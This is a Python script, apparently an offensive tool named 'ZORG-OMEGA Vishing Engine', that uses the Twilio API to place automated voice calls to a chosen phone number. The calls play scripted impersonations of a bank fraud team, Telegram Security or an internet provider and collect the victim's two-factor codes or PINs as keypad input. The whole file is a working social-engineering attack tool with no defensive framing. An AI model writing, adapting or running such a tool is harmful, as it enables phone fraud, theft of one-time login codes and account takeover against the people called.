#!/usr/bin/env python3
import os
import sys
import argparse
import time
# Requires: pip install twilio
from twilio.rest import Client

# ZORG-OMEGA: PROJECT SIREN
# AUTOMATED VISHING & SOCIAL ENGINEERING ENGINE

def banner():
    print("=== ZORG-OMEGA: VOICE INTERCEPTION MODULE ===")

def initiate_call(target, scenario, account_sid, auth_token, from_number):
    print(f"[*] Initializing SIP Trunk...")
    print(f"[*] Target Locked: {target}")
    
    # Scenarios
    scripts = {
        "bank": "Hello. This is the Fraud Security Team at your bank. We detected a suspicious transaction of $1,200. If this was not you, please press 1 now. To verify your identity, please enter the 6-digit code sent to your mobile device.",
        "telegram": "This is Telegram Security. Someone is attempting to access your account from a new device in Russia. If this was not you, please dictate the 5-digit login code sent to your SMS to block this request.",
        "isp": "This is your Internet Service Provider. Your modem is reporting a critical error. Please verify your account PIN to prevent service disconnection."
    }
    
    msg = scripts.get(scenario, scenario) # Use predefined or custom text
    
    try:
        client = Client(account_sid, auth_token)
        
        # TwiML for TTS
        twiml_payload = f'<Response><Say voice="alice">{msg}</Say><Gather input="dtmf" timeout="10" numDigits="6"><Say>Please enter the code now.</Say></Gather></Response>'
        
        call = client.calls.create(
            twiml = twiml_payload,
            to = target,
            from_ = from_number
        )
        print(f"✅ CALL DISPATCHED! SID: {call.sid}")
        print("[*] Listening for DTMF tones (2FA Codes)...")
        
    except Exception as e:
        print(f"❌ CALL FAILED.")
        print(f"Details: {e}")
        try:
            # Try to print specific Twilio error code if available
            print(f"Twilio Code: {e.code}")
            print(f"Twilio Msg: {e.msg}")
        except:
            pass
        print("[!] Checklist:\n1. Is the target number correct (+1...)?\n2. Are you on a Trial Account? (Target must be verified)\n3. Is your SID/Token correct?")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ZORG-OMEGA Vishing Engine')
    parser.add_argument('-t', '--target', help='Target Phone Number (e.g., +15550000000)', required=True)
    parser.add_argument('-s', '--scenario', help='Scenario: bank, telegram, isp', default='telegram')
    
    # Credentials (typically loaded from env or config)
    SID = os.environ.get('TWILIO_SID') or "AC_YOUR_SID_HERE"
    TOKEN = os.environ.get('TWILIO_TOKEN') or "YOUR_AUTH_TOKEN"
    FROM = os.environ.get('TWILIO_NUMBER') or "+15551234567"
    
    args = parser.parse_args()
    
    banner()
    if SID == "AC_YOUR_SID_HERE":
        print("⚠️ ERROR: TWILIO CREDENTIALS MISSING.")
        print("Please export TWILIO_SID, TWILIO_TOKEN, and TWILIO_NUMBER environment variables.")
        sys.exit(1)
        
    initiate_call(args.target, args.scenario, SID, TOKEN, FROM)